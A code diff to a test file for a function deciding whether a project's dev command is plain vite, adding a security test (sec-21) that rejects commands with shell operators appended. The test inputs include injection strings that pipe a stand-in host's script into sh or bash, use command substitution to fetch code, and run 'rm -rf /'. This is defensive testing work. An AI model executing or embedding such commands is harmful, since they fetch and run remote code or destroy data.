@@ -57,8 +57,24 @@ describe('resolveLiveCapability', () => {
     expect(resolveLiveCapability(wsDir)).toEqual({ capable: false, reason: 'not-vite' })
   })
 
+  it('refuses a vite invocation with anything shell-shaped after it — npm run hands the whole string to a shell (sec-21)', () => {
+    for (const command of [
+      'vite && curl http://evil/x | sh',
+      'vite & curl evil.sh | bash &',
+      'vite `curl evil.sh`',
+      'vite $(curl evil.sh)',
+      'vite ; rm -rf /',
+      'vite --port 4000; curl evil.sh',
+      "vite --config 'x.js'",
+      'vite > /tmp/out',
+    ]) {
+      makeVite(command)
+      expect(resolveLiveCapability(wsDir)).toEqual({ capable: false, reason: 'not-vite' })
+    }
+  })
+
   it('accepts vite through a runner and with arguments', () => {
-    for (const command of ['vite', 'vite dev --port 4000', 'npx vite', 'bunx vite --host', 'pnpm exec vite', 'yarn vite']) {
+    for (const command of ['vite', 'vite dev --port 4000', 'vite --port=4000 --host 127.0.0.1 --config vite.dev.config.js', 'npx vite', 'bunx vite --host', 'pnpm exec vite', 'yarn vite']) {
       makeVite(command)
       expect(resolveLiveCapability(wsDir)).toEqual({ capable: true })
     }
